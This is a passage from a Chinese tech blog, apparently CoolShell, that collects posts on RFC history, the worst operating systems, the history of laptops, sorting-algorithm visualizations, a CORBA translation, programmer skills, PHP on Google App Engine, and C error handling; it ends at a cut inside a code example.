RFC包含了关于Internet的几乎所有重要的文字资料。如果你想成为网络方面的专家，那么RFC无疑是最重要也是最经常需要用到的资料之一，所以RFC享有网络知识圣经之美誉。通常，当某家机构或团体开发出了一套标准或提出对某种标准的设想，想要征询外界的意见时，就会在Internet上发放一份RFC，对这一问题感兴趣的人可以阅读该RFC并提出自己的意见；绝大部分网络标准的制定都是以RFC的形式开始，经过大量的论证和修改过程，由主要的标准化组织所制定的，但在RFC中所收录的文件并不都是正在使用或为大家所公认的，也有很大一部分只在某个局部领域被使用或并没有被采用，一份RFC具体处于什么状态都在文件中作了明确的标识。



**RFC的历史**

RFC文件格式最初作为ARPA网计划的基础起源于1969年。如今，它已经成为IETF、Internet Architecture Board (IAB)还有其他一些主要的公共网络研究社区的正式出版物发布途径。

最初的RFC作者使用打字机撰写文档，并在美国国防部国防前沿研究项目署（ARPA）研究成员之间传阅。1969年12月，他们开始通过ARPANET途径来发布新的RFC文档。第一份RFC文档由洛杉矶加利福尼亚大学（UCLA）的Steve Crocker撰写，在1969年4月7日公开发表的RFC 1。当初Crocker为了避免打扰他的室友，是在浴室里完成这篇文档的。

在1970年代，很多后来的RFC文档同样来自UCLA，这不仅得益于UCLA的学术质量，同时也因为UCLA是ARPANET第一批Interface Message Processors (IMPs)成员之一。

由Douglas Engelbart领导的，位于Stanford Research Institute的Augmentation Research Center (ARC)是四个最初的ARPANET结点之一，也是最初的Network Information Centre，同时被社会学家Thierry Bardini记录为早期大量RFC文档的发源地。

从1969年到1998年，Jon Postel一直担任RFC文档的编辑职务。随着美国政府赞助合同的到期，Internet Society（代表IETF），和南加州大学（USC）Information Sciences Institute的网络部门合作，（在IAB领导下）负责RFT文档的起草和发布工作。Jon Postel继续担任RFC编辑直到去世。随后，由Bob Braden接任整个项目的领导职务，同时Joyce Reynolds继续在团队中的担任职务。

庆祝RFC的30周年的RFC文件是RFC 2555。

**RFC文件的架构**

RFC文件只有新增，不会有取消或中途停止发行的情形。但是对于同一主题而言，新的RFC文件可以声明取代旧的RFC文件。RFC文件是纯[ASCII](https://coolshell.cn/w/index.php?title=ASCII&variant=zh-cn)文字档格式，可由电脑程式自动转档成其他档案格式。RFC文件有封面、目录及页首页尾和页码。RFC的章节是数字标示，但数字的小数点后不补零，例如4.9的顺序就在4.10前面，但9的前面并不补零。[RFC1000](http://www.faqs.org/rfcs/rfc1000.html)这份文件就是RFC的指南。

**RFC文件的产生**

RFC文件是由Internet Society审核后给定编号并发行。虽然经过审核，但RFC也并非全部严肃而生硬的技术文件，偶有恶搞之作出现，尤其是4月1日愚人节所发行的，例如[RFC 1606](http://tools.ietf.org/html/rfc1606): A Historical Perspective On The Usage Of IP Version 9（参见[IPv9](https://coolshell.cn/w/index.php?title=IPv9&variant=zh-cn)）、[RFC 2324](http://tools.ietf.org/html/rfc2324)：“[超文字咖啡壶控制协定](https://coolshell.cn/w/index.php?title=HTCPCP&variant=zh-cn)”（*Hyper Text Coffee Pot Control Protocol*，乍有其事的写了**HTCPCP**这样看起来很专业的术语缩写字）。以及如前面所提到纪念RFC的30周年庆的RFC文件。

**相关链接**

- [IETF RFC](http://www.ietf.org/rfc.html)
- [RFC Editor](http://www.rfc-editor.org/)
- [RFC的中译文档](http://www.cnpaf.net/class/rfc)

上面的资料来源于维基百科：[http://zh.wikipedia.org/wiki/RFC](https://zh.wikipedia.org/wiki/RFC)

# 十大史上最恶心的操作系统

[Computer World](http://www.computerworld.com/)上有人评出了有史以来十大臭名照著的操作系统，我们来看看倒底有那些，顺便也回顾一下操作系统的历史。下面的顺序通过时间顺序由古至今。

目录



[OS/360, 1964](https://coolshell.cn/articles/394.html#OS360_1964)[ITS(Incompatible Timesharing System), 60年代后期](https://coolshell.cn/articles/394.html#ITSIncompatible_Timesharing_System_60年代后期)[GNU Hurd, 1983启动，至今也没有完成](https://coolshell.cn/articles/394.html#GNU_Hurd_1983启动，至今也没有完成)[Windows 1.01, 1985](https://coolshell.cn/articles/394.html#Windows_101_1985)[MS-DOS 4.0, 1988](https://coolshell.cn/articles/394.html#MS-DOS_40_1988)[SCO Open Desktop, 1989](https://coolshell.cn/articles/394.html#SCO_Open_Desktop_1989)[JavaOS, 1996](https://coolshell.cn/articles/394.html#JavaOS_1996)[Windows Me (Millennium Edition千禧版), 2000](https://coolshell.cn/articles/394.html#Windows_Me_Millennium_Edition千禧版_2000)[Lindows/Linux XP Desktop, 2001/2006](https://coolshell.cn/articles/394.html#LindowsLinux_XP_Desktop_20012006)[Windows Vista, 2006](https://coolshell.cn/articles/394.html#Windows_Vista_2006)

#### [OS/360](http://www.britannica.com/EBchecked/topic/1461036/IBM-OS360), 1964

这里，说的不是后面新版的OS/360，这里说的是60年代未70年代初的第一版的OS/360。当时的Project Manager，Fred Brooks， 《人月神话》 *[The Mythical Man-Month](https://www.amazon.com/reader/0201835959#reader)*的作者，这是一本非常经典的告诉你软件开发是如何失败的一本书。在书中，Brooks解释说，他们需要了比较计划更多的内存，最后导致了预算超标了好几次，当然，最终这个操作系统还是很慢。另一方面，这本书中也出现了一句网络上的流行语：”Adding manpower to a late software project makes it later.” （在项目的后期加入人手只会让项目更拖）Brooks 喜欢像一本软件开发者的圣经一样描述，因为”everybody reads it, but nobody does anything about it.” 在书中他展开描述了这个故事后，我们才知道他是对的。



#### [**ITS**](https://en.wikipedia.org/wiki/Incompatible_Timesharing_System)(Incompatible Timesharing System), 60年代后期

 在 DEC PDP-6 和PDP-10 使用汇编语言开发的操作系统上，当你面对着——每一个目录中只能有一个6个字符的文件时，每一个目录？（是的，每一个文件必需放在一个目录中，每一个目录也只能放一个文件），你会有什么样的想法？并且，这个操作系统的安全等零，例如：没有口令系统，你可以随意地登录，并且可以干所有的事。

但是，实际上来说，ITS却是一个非常重要的操作系统，因为它最终发展成了顶顶大名的Unix，今天许许多多的程序，如 [Emacs 编辑器](http://www.gnu.org/software/emacs/) 和 [Lisp语言](http://knowledgerush.com/kr/encyclopedia/Lisp_programming_language/)，都是从ITS开始的。ITS操作系统，也是电脑黑客最早出现的地方，你可以看一看，Steve Levy 的经典图书 *[Hackers](https://www.amazon.com/Hackers-Computer-Revolution-Steven-Levy/dp/0141000511)*.。你会在这本书里找到娱乐和有趣，并会非常高兴自己并没有使用过这个操作系统。

 

#### [GNU Hurd](http://www.gnu.org/), 1983启动，至今也没有完成

你想知道为什么今天的Linux要叫做GNU/Linux吗？官方的解释是，Linux只不过是操作系统的内核（[OS kernel](http://www.webopedia.com/TERM/k/kernel.html) ），而其周围全是GNU的软件，从而成为了一个完整的操作系统。 [GNU](http://www.gnu.org/) 曾经在1983年向全世界宣告他们会在未来开发出一个取代Unix的操作系统，以此作为整个自由软件的操作系统。

但是，25年过去了，GNU还是什么也没有完成，其操作系统内核 [Hurd](http://www.gnu.org/software/hurd/hurd/what_is_the_gnu_hurd.html)，就重来没有真正的开始工作过。虽然这是一个可能非常理想的操作系统，但作者把这个操作系统归入Top 10的理由是——经过了四分之一个世纪，GNU并没有按照自己的承诺完成对Unix的替代。但这个事情却被别的软件所取代，比如：Linux和BSD Unix，让我们看一下Linux那夸张的[数量众多的发行版](https://en.wikipedia.org/wiki/List_of_Linux_distributions)吧。

#### [Windows 1.01](https://en.wikipedia.org/wiki/Windows_1.0), 1985

Microsoft第一次尝试图形用户接口是为了 MS-DOS ，用一个词来形容，就是 dreadful。相当的ugly，用了两年的时间来开发但却几乎无法很好的工作。另外，这个图形界面中几乎没有什么可以运行的东西。直到两年后的Windows 2.03 ，Windows才开始像点样了。

再让我们对这个操作系统加点侮辱性的词汇吧，自从Windows 1 发布以来，Mac 早就提供了起前的 System 2.1，当时的Mac OS 包含了AppleTalk 网络，PostScript 可以使用激光打印机，以及最早的PC文件系统：Hierarchical File System. 连比都没法比。

#### [MS-DOS 4.0](http://nukesoft.co.uk/msdos/dosversions.shtml), 1988

1988 年微软在其MS-DOS 上花费了大量的时间来改善其，当然，MS-DOS是一版不如一版，虽然比起MS-DOS3.3都很差，但自从令人恐怕MS-DOS 4.0问世以来，其它更烂MS-DOS都不能算得上烂了。你的程序就像时钟一样的总是终断，在程序执行到一样总是会完全死了。除了Windows的蓝屏之外，没有比这再烂的事了。

当时，几乎所有的PC要么都回到了MS-DOS 3.3 ，要么就转于使用 Digital Research的 DR-DOS 3.41 。虽然 DR-DOS 的版本号是在模仿MS-DOS 以提供相似的功能，但是Digital Research 最终在 1989 年使用了 DR-DOS 5.0 来避免人们会联想到 MS-DOS 4.0。



#### [SCO Open Desktop](http://www.websters-dictionary-online.org/Op/Open+Desktop.html), 1989

正面来说，这是第一个32位的 Unix 的图形界面，负面来说，这个操作系统的昵称叫 Open Deathtrap。Open Desktop 会是，也能够，并提供一些最令人娱乐的方式。一个编译器可以让整个系统core dump 。



#### [JavaOS](http://www.operating-system.org/betriebssystem/_english/bs-javaos.htm), 1996

想知道什么是最糟糕的操作系统的想法吗？那就是使用一种慢得像泥巴一样的语言Java来写这个操作系统。1996年，得到了IBM的帮助的Sun尝试了这件事。JavaOS 当时被设计在网络计算机上和嵌入式系统上。

那会是怎么个样子呢？让我这样来说吧：这个世界上有许多的嵌入式操作系统，如： Qnx, VxWorks, Symbian, Windows CE 等等，但是，在这个圈子里，几乎没人知道还有JavaOS这么个东西。

虽然有几个公司得到了许可证，但是只有一个产品在商业上使用了这个东西，那就是Sun公司自己的可能都忘了的 [JavaStation network computer](http://docs.sun.com/app/docs/doc/805-5890-10/6j5ic0vpe?l=en&a=view)。到了 2006年， Sun公司开始清理他自己的废弃的系统时，最终把结束了基于 Java的操作系统。

#### [Windows Me](https://en.wikipedia.org/wiki/Windows_Me) (Millennium Edition千禧版), 2000

在Vista出来之前，Windows Me 绝对是Windows系列中最差的操作系统，作为Windows 98 SE的继任者，在 *PC World* [25 史上最烂的科技产品](http://www.pcworld.com/article/125772-2/the_25_worst_tech_products_of_all_time.html)中排行第四。这是一个想集16位和 32位为一身的操作系统。就像给一匹马的每条前腿上都装上一个轮子，而在后腿上钉上马掌。缓慢，不稳定，不安全，这些都是Windows的共性，但是Windows ME是终极的缓慢，不稳定和不安全。它究竟有多烂？烂到了微软自己也就卖了它一年多一点吧。



#### [Lindows](http://www.wired.com/software/coolapps/news/2001/10/47888)/[Linux XP Desktop](http://www.linux-xp.com/), 2001/2006

如果你想要把 Linux 和 Windows 放在一起会怎么样？Nothing very good。 Lindows, 始于2001年，号称要把所有的Windows的程序可以运行在Linux下， 但没有几个月，Lindows Inc. 放弃了这个想法。就算是[WINE](http://www.winehq.org/)，这个程序也没有办法让足够多的Windows程序运行于Linux。

当然，这些SB的想法并没有就上终止，Russia-based TrustVerse 还在试图 “We’ll be everything Windows, but we’re Linux” 去创建一个 Linux XP Desktop。这个想法并没有比 Lindows 好多少。如果你真的想在Linux下运行Windows的应用程序，你应该看看——CodeWeavers的 [CrossOver Linux](http://www.codeweavers.com/products/cxlinux/).



#### [Windows Vista](http://www.microsoft.com/windows/windows-vista/discover/default.aspx), 2006

相信你对这个操作系统不会感到陌生，那我们就用再一一列举这个系统的不好的地方了。反正，就是慢，软硬件不兼容，高成本，安全差等等这些事。

看看这篇文章 [“Vista Capable” sticker](http://blogs.computerworld.com/microsoft_caved_to_intel_in_vista_junk_pc_scheme)你可能会知道一些，下面摘自 [early “review” of Vista](http://www.computerworld.com/action/article.do?command=viewArticleBasic&articleId=9065538):

> “I chose my laptop (a Sony TX770P) because it had the Vista logo and was pretty disappointed that it not only wouldn’t run [Aero], but more important wouldn’t run [Windows] Movie Maker. … Now I have a $2,100 e-mail machine.”

谁是这个评论的作者？ Mike Nash, Microsoft公司的副总裁，主管Window产品。这是和他一个内部的邮件，时间是 2007年2月25日。

再看看这篇文章[downgraded to XP](http://www.computerworld.com/action/article.do?command=viewArticleBasic&articleId=9112885), 以及这篇文章 [extending the cutoff date for XP sales](http://blogs.computerworld.com/xp_lives_for_a_price) 还有这篇，[hurrying Windows 7 to market](http://blogs.computerworld.com/vista_r_i_p) 越来越有意思了。



文章：[来源](http://www.computerworld.com/action/article.do?command=viewArticleBasic&taxonomyName=Operating+Systems&articleId=9131178&taxonomyId=89&pageNumber=1)

（全文完）

# 笔记本电脑的发展史

这是一段比较有趣的历史，让我们回顾一下笔记本电脑的整个历史吧。可能叫便携式电脑比较好一点。

**1970 – 1981 第一个便携式的电脑概念**

上世纪70年代，Alan Kay 在 Xerox PARC开始有了便携式个人电脑的想法。到了1981年， Osborne 1问世，其由Adam Osborne创造。如下图。Osborne 1 有一个5英寸的屏幕，还有一个可选的电池，两个5 ¼” 软驱，一个 modem 接口，还有一个键盘。当时的价格是$1,800（包括一块电池）。

[![osborne1](photo/osborne1.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/osborne1.jpg)

 

### 1981 – 1984 : Gavilan 和 IBM

没有多久Gavilan Mobile Computer公司也进入了这个行业。其第一个便携式电脑的原型和今天的笔记本电脑非常相似，而且只有4公斤重并且配备了一个可以运行9个小时的镍镉电池。无论是从性能还是设计上来说，在1983年，这已经是非常超前的。而且这是 Galvin 第一次向市场引入了“移动PC”的术语。

[![gavilan-mobile-computer](photo/gavilan-mobile-computer.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/gavilan-mobile-computer.jpg)

Osborne 1的出现后， 微软公司的Kazuhiko Nishi 开始了一个便携式电脑的原型，其采用了LCD显示屏，重量2 kilos，叫做“Radio Shack TRS-80 Model 100 Mobile Computer”，有一个 modem，还有一个无线电通讯的程序，以及一个文本编辑器和一个由微软开发的小程序。总的来说，这更像是一个无线装置。（如下图）

[![radio-shack-trs-80-model-100-mobile-computer](photo/radio-shack-trs-80-model-100-mobile-computer.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/radio-shack-trs-80-model-100-mobile-computer.jpg)

随着我们的“Radio Shack”让我们的便携式电脑看起来更像是笔记本电脑，IBM也开发进入这个市场，其于1984年开发了Portable PC 5155。但是，这个便携式电脑犯了一个可怕的错误，那就是其“便携”的重量有13.6公斤，而且有一个9英寸的显示器，价格在$ 4000。而且，你还得随时插在电脑插座上，因为它根本没有电池。所以，5155 充其量只不过是一个“可以容易搬动的台式电脑”。不过非常感谢IBM的是，他们只用了1年的时间就终止了这个畸形的产物。

[![ibm-portable-pc-5155](photo/ibm-portable-pc-5155.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/ibm-portable-pc-5155.jpg)

 

### 1984 – 1988: Compaq

在接下来的几年，笔记本电脑几乎没有什么发展。不过Compaq 公司在1988 的时候开发了一台便携式电脑Compaq SLT 286，有一个VGA的显示器，1.44英寸的软戏和一颗286的CPU，只是重量有6公斤。

[![compaq-slt-286](photo/compaq-slt-286.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/compaq-slt-286.jpg)

###  

### 1989 – 1993: NEC，Zenith的MinisPORT 以及 第一代的Macintosh

NEC 公司改变了便携式电脑重量太重的局面，他的 NEC UltraLite model— 第一个有完整功能的基于MS-DOS的便携式PC机只有4.4 磅（2公斤左右）。而其接下来具有革命性的发展是在90年代，但其开始1989年，由 Zenith Data Systems 公司生产的 Minisport，其带 640K的RAM，1.44英寸的软驱，一个2400波特率的Modem以及一个20MB ESDI 硬盘。虽然其只有一个彩色的LCD显示器，但是，也足够不错了。从此开始了便携电脑的新纪元。

[![zeniths-minisport](photo/zeniths-minisport.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/zeniths-minisport.jpg)

接下来，我们来看一下，苹果公司的第一代Macintosh 便携机，重达8公斤，但是其有 9.8英寸的最大分辨率有 640 x 400像素的显示器。

[![macportable](photo/macportable.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/macportable.jpg)

到了1993年，我们开始有了 256色的显示器，其代表产品是PowerBook 165c。然后，我们开始进入今天，百万像素的真彩色显示器，更好和更轻的的笔记本电脑，更为灵活的设计，更好的性期，并开始有了多媒体包括CD-ROM。然后，真正没有让笔记本电脑流行的是，笔记本电脑的性价比，价格太贵了，像ThinkPad和MacBook也是在那时出现的，但是没有多少人能真正地买得起。

[![powerbook-165c](photo/powerbook-165c.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/powerbook-165c.jpg)

 

**1996 – 2003 : Panasonic 的ToughBooks 和Intel 处理器**

1996年Panasonic 公司引入了新一代的笔记本电脑——Toughbook (CF-25)，70 cm高，可以抵抗灰尘和水气，非常明显，松下公司想改变便携式电脑的观念，感觉上这个电脑更像是一个军用的。就算是使用枪击过的电脑，电脑也能正常工作。

 [![panasonic-toughbook-cf-25-bullets](photo/panasonic-toughbook-cf-25-bullets.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/panasonic-toughbook-cf-25-bullets.jpg)

以后，直到2003年，直到Intel开发出了不可思异地低能耗的 Pentium M 处理器，其在整个笔记本电脑的发展上写下了重重的一笔，而且价格上开始了巨大的松动，于是笔记本电脑也开始进了一平常百姓家里。

 **今天和未来**

让我们来看看今天的电脑吧。今天，无线连接，蓝牙，Wi-Fi, DVD 光驱, 高级显卡，宽屏，超薄，口袋电脑，……

Apple Macbook Air

[![macbook-air](photo/macbook-air.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/macbook-air.jpg)

Asus EEE PC S101

[![asus-eee-pc-s101](photo/asus-eee-pc-s101.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/asus-eee-pc-s101.jpg)

 

我们再来看看未来的电脑，下图是Sony VAIO Zoom，一台使用全息技术的笔记本电脑。可能未来还不止如此，让我们一起期望……

[![sony-zoom](photo/sony-zoom.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/sony-zoom.jpg)

文章：[来源](http://www.geekwithlaptop.com/laptop-revolution-where-size-does-mater-a-whole-lot/)

# 一个排序算法比较的网站

下面这个网站是一个非常丰富的排序算法的网站。

#### Sorting Algorithm Animations http://www.sorting-algorithms.com/

这是一个非常不错的排序算法的网站，当你打开这个网站的时候，请不要因为看到很多个图片的大红叉而鄙视它。你先点击网页上方的Problem Size，选择一个尺寸，20，30，40还是50，都行，于是你就可以看到下面整个大表中有图片显示出来了。如下所示：

[![sort](photo/sort-300x160.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/sort.jpg)



其中，

- **列。**是代表每一个排序算法，有“插入”“选择”“冒泡”“Shell”，“合并Merge”，“堆排序”，“快速排序”，“快速3排序”。单击每个一算法的链接，你可以看到这个算法的详细解释，其中包括，算法的伪代码，算法的复杂度，相关的讨论，重点，以及该算法的相关参考文档。
- **行。**是不同的数据样本，第一个是“随机样本”，第二个是“几乎排好序的样本”，第三个是“最差的样本（反序）”，第四个是“有一些相同项的样本”。这些样本在不同的算法上都会有不同的表现。
- **单元格**。每个单元格都是一个图片。简单的用鼠标单击一下每个图片，可以动画地演示算法整个过程。其中两个小红箭头表示了正在需要“交换顺序的数据”。

这个网站，还是做得很8错的。希望大家喜欢。

# 深入浅出CORBA

这个是一本关于CORBA技术的中文文档，原文是[Ciaran McHale](http://www.ciaranmchale.com/)《CORBA Explained Simply》，我将其翻译成中文形式，并首发在[酷壳](https://coolshell.cn/)之上，现在先提供一个PDF的文件形式下载，关于html形式的下载或在线阅读形式以后再慢慢整理。CORBA有可能是一门将要过时的技术，但是它的思想却仍然被当今一些流行的分布式架构所借鉴。所以通过学习CORBA，也许我们可以更好的去理解EJB，去理解Web Service，或者SOA……



> **译序**
>
> 从wiki上找到此书的链接，初读之下，感觉此文讲解的非常清楚，大量丰富的图例说明，于是就有了将此书翻译成中文的冲动。至于书名本应该是《简单地解释CORBA概念》，但是最后还是起了一个比较容易吸引人眼球的标题。
>
> 本书原文行文非常流畅，用词也相当通俗易懂，建议有英文基础的同行直接阅读原文。
>
> 本书第二十三章的内容，涉及到安全的一些概念和术语，翻译也相对比较困难，我虽然给它翻完，但是最后还是不敢发布出来，因为此章需要对安全相关知识要有全面的理解，最后我将此章翻译的内容省略。
>
> 在翻译过程，有一些特殊的名词采用意译的方式，比如IDL的seqence类型，被翻译为可变数组，Servent被翻译服务提供者，而在IOR中的Contact Detail我统一翻译为联系细节等等，请读者在阅读时特别注意。
>
> 由于译者的水平有限，书中难免有翻译错误的地方，译者并不会对因为这错误造成的损失负责。
>
> 本书原版的版权归[Ciaran McHale](http://www.ciaranmchale.com/)所有，此版中文版版权归译者和[酷壳](https://coolshell.cn/)网所有，任何公司或个人可以任意自由转载，发布，部分发布，出版，部分出版本书，但必须保留如下的版权信息
>
> Copyright © 2009 赵锟
>
> Copyright © 2009 [酷壳](https://coolshell.cn/)
>
> 感谢我的夫人在翻译过程中给我支持，没有她的鼓励，我无法完成此项工作。同时感谢我9个月大的小孩，你那可爱和天真无邪的微笑是我工作的动力。
>
> 感谢[酷壳网](https://coolshell.cn/)的耗子在翻译过程中对我的指导。非常感谢你的帮助。
>
> 在阅读过程中，你什么意见和建议欢迎发邮件至zhaokun.km(a)gmail.com (请将(a)替换成@)和我进行讨论。

PDF文件下载：请点击[这里](https://coolshell.cn/wp-content/uploads/2009/04/e6b7b1e585a5e6b585e587bacorba.zip)进行下载

# 未来五年程序员需要掌握的10项技能

由于最近经济形势的变化，很多开发人员只关注他们短期的工作前景。与此同时，把时间和精力花在学习最能带来回报的新技术上是件非常重要的事情。这里是我们列举的10种你需要马上开始学习的技术，让你的简历在未来5年不会落伍。这个列表并不完全，有很多业界的领域（比如大型机开发人员）没有涉及。尽管如此，对通常的主流开发来说，学习其中至少7项技能肯定不会错 ——不但要达到能在面试时侃侃而谈的程度，还得能在工作中运用自如。

**1) 编程语言三选一 (.NET, Java, PHP)**
除非开发世界有根本的改变（类似小行星击中雷德蒙），在不远的将来，大部分开发人员将需要了解三大开发平台——.NET (VB.NET或者C#), Java, 或者PHP——中的至少一个。并且只了解核心语言也是不够的。因为项目会包含越来越多不同的功能，你需要对相关框架和库有深入的了解。（本人以为C/C++可能比这三个语言更有竞争力）



**2) 互联网Rich Application (RIAs)**
不管爱她还是恨她，最近几年，Flash的用途突然间不仅仅是制作政治人物弱智歌曲演唱动画而已了。Flash也萌生出了以Flex和AIR为形式的附加功能。Flash的竞争对手，比如JavaFx和Silverlight，也在不停的在特性和性能上加筹码。HTML5集成了所有RIA的功能，包括数据库连接，而W3C正式地贴上了AJAX的标签。在不久的将来，RIA专家将会是简历的一个重要筛选条件。

**3) Web开发**
Web开发在近期内不会消失。很多开发人员满足于忽略Web或者只是使用他们的框架给他们提供的”基本元素”。但是公司需要越来越多的真正知道怎样使用底层技术进行“手工编码”的人。所以要获得成功请在未来5年里努力钻研JavaScript，CSS和HTML。

**4) Web服务**
REST或者SOAP？JSON或者XML？ 尽管选项和答案取决于项目本身，不使用或者创建Web服务对一个开发人员（甚至是那些不做Web应用程序的）来说越来越困难。那些原来采用ODBC，COM或者RPC domains的领域，现在也在某种程度上过渡到了Web服务。不会用Web服务的开发人员将会发现他们被排挤或者沦为维护人员。

**5) 其它软实力**
有一种已经开始了很久的趋势，IT在企业内部或者外部变得越来越透明。开发人员被卷入越来越多的非开发性会议和过程以给与反馈。举个例子，CFO要改变会计规则不能不依靠IT去更新系统。如果没有IT去升级CRM的工作流，运营经理就不能更改呼叫中心的流程。同样的，客户常常需要和开发小组一起工作来保证他们的需求被满足。每一个开发人员都需要找主持人帮助或者去学习《怎样结交朋友并影响别人》么？不是。但是拥有这种能力的开发人员对他们的雇主来说更有价值——并且更抢手。

**6) 掌握一门动态的和/或一门函数编程语言
**像Ruby，Python, F#, 和Groovy这样的语言并不很主流——但是他们包含的想法却是。比如说，微软的.NET中的LINO系统是函数编程技术的直接产物。Ruby和Python在某些部门很热门，分别感谢Rails框架和Silverlight。学习其中的一门语言不只会提升你的简历；它能开阔你的视野。我见过的每一个顶级开发人员都推荐学习至少一种动态或者函数编程语言，用来理解新的思考方式，个人经验来讲，我可以告诉你确实有用。

**7）敏捷开发方法**
在敏捷开发方法刚开始进入主流视线的时候，我持怀疑态度，和其他我认识的很多家伙一样。它看起来就像某种对传统的下意识反应，丢掉控制和标准而偏爱混乱。但是随着时间的推移，敏捷开发背后的智慧被更好的定义和表达出来。很多团队不是应用了敏捷开发就是在进行敏捷开发的概念证明实验。尽管敏捷开发不是治愈项目失败的终极灵药，它的确在很多项目上有一席之地。在未来几年里，对有着敏捷开发环境的理解和成功经验的开发人员的需求将会高速增涨。

**8) 相关领域知识**
和敏捷开发密切关联，开发小组在项目定义中被越来越多的看做是同伴。这意味着了解问题领域的开发人员能够用更可见的，高价值的方式给项目作出贡献。敏捷开发中，一个能够说，“从这里，我们也可以很简单的添加这项功能，而且这能给我们带来很多回报，” 或者 “噢，这个要求和我们的日志中显示的使用模式并不相符” 的人将是优胜者。正如许多开发人员有抵制了解问题领域的想法，不可否认的是越来越多的组织希望（如果不是要求）开发人员至少能理解基本的内容。

**9) 开发修养**
几年之前，很多（如果不是大部分）团队都没有使用bug跟踪系统，版本控制，和其他类似工具；只有开发人员和他们选择的IDE。但是，感谢新的整合套件的开发，比如Microsoft Visual Studio Team System以及高质量开源环境的爆炸性发展，没用到这些工具的组织变得更不常见。开发人员必须比知道怎么在代码控制中提交和获得代码或者怎样用VM系统配置测试环境了解更多的东西。他们需要在适当的地方养成严格的卫生习惯以保证他们和其他的小组恰当的合作。“代码牛仔”，把所有的东西存放在私人USB盘上，不把对任务对象的相应改变记录成文档，等等的人，在传统的团队里不受欢迎，在需要团队成员之间紧密合作的敏捷开发环境中更是如此。

**10) 移动无线开发**
上世纪90年末代web开发被主流接受开始在很多领域将传统的桌面程序边缘化，在2008年，移动无线开发开始兴起，在未来5年里，它将会变得越来越重要。当然，移动开发有很多不同的方法：针对移动设备的web应用程序开发，针对市场的RIAs，和直接在设备上运行的应用程序。不管你选择了哪个方向，把移动开发加入你的技能集会保证你满足未来的需求。

# NUI一个跨平台的C++库

这个免费的GPL许可证的C++库据说可以跨Linux, MacOS, Windows和iPhone，太过份，居然还连iPhone也跨了。

大家可以到下面这个网址上下载下来试试看，我还没有来得及试。

http://www.libnui.net/

[![home](photo/home-300x168.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/home.jpg)

# 如何在GOOGLE APP ENGINE上运行PHP

Google 在一年前发布了[Google App Engine](https://code.google.com/appengine/) (GAE) 。这是一个免费的 App Engine 主机，可以让你的每个Application（免费的最多有10个）有1GB的磁盘空间和43.6个CPU小时与10GB的上传和10GB的下载带宽，以及2000个电子邮件。如果你需要地更多，那就是付钱了。

GAE 最近发布了正式[支持Java](https://googleappengine.blogspot.com/2009/04/seriously-this-time-new-language-on-app.html)的通知。于是，互联网上开始有了各种各样的BLOG评论文章，还有一些人居然在Google App Engine 中运行PHP程序，这个太不可思议了。因为GAE目前并不支持PHP。

其实，他们使用了一个叫做 [Quercus](http://www.caucho.com/resin-3.0/quercus/)的东东， Quercus 本质上是一个 100% 的用Java 实现的一个 PHP 引擎 (需要 JDK 1.5)，所以，只要你把Quercus集成到你的GAE中，你自然也可以运行PHP脚本了。



下面是大体步骤：

1) 注删一个 [免费的帐号](https://appengine.google.com/)。
2) 下载[这个文件](http://www.webdigi.co.uk/fun/php-appengine/phpwithjava.zip) 到你本机。
3) 在 war\WEB-INF\appengine-web.xml 编辑应用的XML tag，把其名字改成你所注册的名字。
4) 最后，[上传你的应用](https://code.google.com/appengine/docs/java/gettingstarted/uploading.html)。

更多细节请参看：

- [http://phpwithjava.appspot.com/webdigi.php](https://phpwithjava.appspot.com/webdigi.phphttp://phpwithjava.appspot.com/info.php)
- [http://phpwithjava.appspot.com/info.php](https://phpwithjava.appspot.com/info.php)

# 一个显示排序过程的PYTHON脚本

之前向大家介绍过《[一个排序算法比较的网站](https://coolshell.cn/articles/399.html)》，那个网站用动画演示了各种排序算法，并分析了各种排序算法。这里，要向大家推荐一个Python脚本，其可以把排序的过程给显示出来。

下图是“**冒泡排序**”的一个示例，其中：

1. 折线表示了各个元素的位置变化。
2. 折线的深浅表示了元素的大小。越深则越大。

[![bubble](photo/bubble.png)](https://coolshell.cn/wp-content/uploads/2009/04/bubble.png)



同样，还有其它一些排序算法的图片：

**堆排序（Heap Sort）**

[![heap](photo/heap.png)](https://coolshell.cn/wp-content/uploads/2009/04/heap.png)

**选择排序（Selection）**

[![selection](photo/selection.png)](https://coolshell.cn/wp-content/uploads/2009/04/selection.png)

**快速排序（Quick）**

[![quick](photo/quick.png)](https://coolshell.cn/wp-content/uploads/2009/04/quick.png)

**Shell排序**

[![shell](photo/shell.png)](https://coolshell.cn/wp-content/uploads/2009/04/shell.png)

**插入排序（Insertion）**

[![listinsertion](photo/listinsertion.png)](https://coolshell.cn/wp-content/uploads/2009/04/listinsertion.png)

你可以使用如下的Python代码来制作这些图片：（需要 [Cairo](http://cairographics.org/)图片库支持）

[**Python排序脚本**](https://coolshell.cn/wp-content/uploads/2009/04/visualise.py)

这个脚本`参数如下：`

- `-a 表示使用什么样的算法，取值为"quick", "heap", "selection", "insertion", "bubble", "shell"。`
- `-n 表示要排序的数据个数。`
- `-f 表示输入文件。`
- `-p 表示文件前缀。`
- `-d 表示输出顺序。`
- `-x 图片宽度。`
- `-y 图片高度。`
- `-l 所有线的宽度。`
- `-b 边界宽度。`

```
使用示例如下：
```

``

```
./visualise.py -l 6 -x 700 -y 300 -n 15
```

``

文章：[来源](http://www.hatfulofhollow.com/posts/code/visualisingsorting/index.html)

# C语言下的错误处理的问题

下面是三种C语言的错误处理，你喜欢哪一种？还是都不喜欢？

```
/* 问题: 不充分，而且很容易出错，前面成功分配的资源，后面出错需要帮助释放 */
int foo(int bar)
{
        int return_value = 0;
        int doing_okay = 1;
        doing_okay = do_something( bar );
        if (doing_okay)
        {
                doing_okay = init_stuff();
        }
        if (doing_okay)
        {
                doing_okay = prepare_stuff();
        }
        if (doing_okay)
        {
                return_value = do_the_thing( bar );
        }
        return return_value;
}
```



```c
